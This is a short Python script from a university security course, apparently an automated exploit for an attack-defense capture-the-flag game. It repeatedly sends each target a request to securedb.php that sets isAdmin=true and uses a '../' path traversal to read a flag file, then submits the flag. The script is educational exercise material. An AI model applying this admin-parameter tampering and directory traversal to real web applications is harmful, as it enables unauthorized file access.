import time
import requests
from class_api import *

##
##	CSE 545 - Spring 2018
##	Team 9: Black Shadow (blackshadow@asu.edu)
##

def main():
    
	# Initialize API wrapper
	api = ProjectCTFAPI()
	
	# Turn on debug mode to see flag submission status
	api.debug = True

	while True:
        targets = api.getTargets(10002)

		for target in targets:

			# Generatae HTTP GET Request
			httpGetStr = "http://" + target['hostname'] + ":" + str(target['port']) + \
				     "/securedb.php?isAdmin=true&method=adminAccessFile&fileName=" + \
				     "../append/" + target['flag_id']

			res = requests.get(httpGetStr)

			if 'FLG' in res.content:
				flag = res.content[-18:-2]
				api.submitFlag(flag)
 
		print "Waiting for the next tick"
		time.sleep(180)


if __name__ == '__main__':
    main()

